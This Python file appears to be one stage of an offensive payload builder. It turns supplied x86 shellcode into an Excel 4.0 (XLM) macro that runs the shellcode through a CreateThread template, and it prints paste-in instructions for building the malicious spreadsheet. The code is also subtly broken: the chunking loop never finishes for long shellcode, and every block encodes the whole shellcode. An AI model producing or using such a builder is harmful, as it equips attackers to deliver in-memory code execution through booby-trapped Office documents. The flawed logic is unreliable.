from stage_builders.stage import Stage

class XLM_Inject(Stage): 
    # WiteProcessMemory can only write 255 bytes at a time; split the shellcode up if it exceeds this length
    def split_shellcode(self, shellcode):
        split = shellcode.split(',')
        shellcode_array = []

        while len(split) > 255:
            shellcode_array.append(",".join(split[0:255]))
            split = shellcode.split(',')[255:]
        shellcode_array.append(",".join(split))
        return shellcode_array



    # encode our shellcode in VBA format
    def encode_shellcode_VBA(self, shellcode):
        encoded_shellcode = ""
        for s in shellcode.split(","):
            encoded_shellcode += "CHAR("
            encoded_shellcode += str(int(s, 16))
            encoded_shellcode += ")&"
        encoded_shellcode = encoded_shellcode[:-1] # remove trailing &
        return encoded_shellcode

    def build(self, build_directory):
        f = open('templates/excel_4_0/CreateThread')
        template = f.read()
        if self.params['final_action'] == "true":
            template += "\n=HALT()"
        print("--------------------------")
        print("MACRO code: paste this into the first column of XLM macro sheet")
        print(template)
        print("--------------------------")
        print("SELLCODE: Paste this into the 3rd column of the spreadsheet: ")
        shellcode = self.params['shellcode_x86']['shellcode_val']
        shellcode_blocks = self.split_shellcode(shellcode)
        for block in shellcode_blocks: 
            encoded_shellcode = self.encode_shellcode_VBA(shellcode)
            print("=" + encoded_shellcode)
        print("END")
        print("--------------------------")




        
            
            
